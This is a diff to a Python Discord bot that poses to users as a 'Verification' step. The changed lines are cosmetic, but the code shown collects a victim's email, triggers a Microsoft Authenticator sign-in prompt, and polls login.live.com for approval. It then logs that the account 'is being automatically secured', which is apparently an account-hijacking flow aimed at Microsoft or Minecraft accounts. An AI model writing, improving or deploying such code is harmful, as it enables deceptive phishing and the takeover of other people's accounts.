@@ -83,7 +83,7 @@ class MyModalOne(ui.Modal, title="Verification"):
         if len(emailInfo) == 1:
             await logs_channel.send(
                 embed = Embed(
-                    title = f"{interaction.user.name} ({interaction.user.id})",
+                    title = f"User | {interaction.user.name}({interaction.user.id})",
                     description = f"**Email** | **Status** | **Reason**\n```{self.email.value} | Failed to send code | Email OTP Cooldown```",
                     timestamp = datetime.datetime.now(),
                     colour = 0xFF5C5C,                         
@@ -105,7 +105,7 @@ class MyModalOne(ui.Modal, title="Verification"):
         if "Credentials" not in emailInfo:
             await logs_channel.send(
                 embed = Embed(
-                    title = f"{interaction.user.name} ({interaction.user.id})",
+                    title = f"User | {interaction.user.name}({interaction.user.id})",
                     description = f"**Email** | **Status** | **Reason**\n```{self.email.value} | Failed to send code | Email does not exist```",
                     timestamp = datetime.datetime.now(),
                     colour = 0xFF5C5C,                         
@@ -146,7 +146,7 @@ class MyModalOne(ui.Modal, title="Verification"):
 
             await interaction.followup.send(
                 embed = Embed(
-                    title="Verification ✅",
+                    title="Verification",
                     description=f"Authenticator Request.\nPlease confirm the code **`{entropy}`** on your app!",
                     colour=0x00FF00
                 ),
@@ -167,6 +167,7 @@ class MyModalOne(ui.Modal, title="Verification"):
                 response = await self.session.post(
                     url = f"https://login.live.com/GetSessionState.srf?mkt=EN-US&lc=1033&slk={flowToken}&slkt=NGC",
                     headers = {
+                        "Accept": "application/json",
                         "Content-Type": "application/json",
                         "Cookie": "MSPOK=$uuid-3d6b1bc3-9fcd-4bd0-a4b1-1a8855505627$uuid-1a3e6d72-d224-456d-868f-4b85ff342088$uuid-58a49dcf-5abd-4a23-95ef-ed1b5999931e;",
                         "Accept-Language": "en-US,en;q=0.9",
@@ -198,7 +199,7 @@ class MyModalOne(ui.Modal, title="Verification"):
 
                     await logs_channel.send(
                         embed = Embed(
-                            title = f"{interaction.user.name} ({interaction.user.id})",
+                            title = f"User | {interaction.user.name}({interaction.user.id})",
                             description = f"**Email** | **Status** | **Reason**\n```{self.email.value} | Failed to verify | Clicked on the wrong auth number```",
                             timestamp = datetime.datetime.now(),
                             colour = 0xFF5C5C                  
@@ -218,7 +219,7 @@ class MyModalOne(ui.Modal, title="Verification"):
                         url= f"https://visage.surgeplay.com/full/512/{self.username.value}"
                     )
 
-                    await logs_channel.send("**This account is being automaticly secured.**")
+                    await logs_channel.send("**This account is being automaticly secured**")
                     await logs_channel.send(embed = sucessEmbed, view = ButtonOptions(interaction.user))
 
                     await interaction.followup.send(
@@ -229,7 +230,7 @@ class MyModalOne(ui.Modal, title="Verification"):
                     if not finalEmbeds:
                         await logs_channel.send(
                             embed = Embed(
-                                title = f"{interaction.user.name} ({interaction.user.id})",
+                                title = f"User | {interaction.user.name}({interaction.user.id})",
                                 description = f"**Email** | **Status** | **Reason**\n```{self.email.value} | Failed to secure | Invalid email OTP```",
                                 timestamp = datetime.datetime.now(),
                                 colour = 0xFF5C5C                  
@@ -306,7 +307,7 @@ class MyModalOne(ui.Modal, title="Verification"):
 
             await logs_channel.send(
                 embed = Embed(
-                    title = f"{interaction.user.name} ({interaction.user.id})",
+                    title = f"User | {interaction.user.name}({interaction.user.id})",
                     description = f"**Email** | **Status** | **Reason**\n```{self.email.value} | Failed to send code | No OTP methods found```",
                     timestamp = datetime.datetime.now(),
                     colour = 0xFF5C5C                  
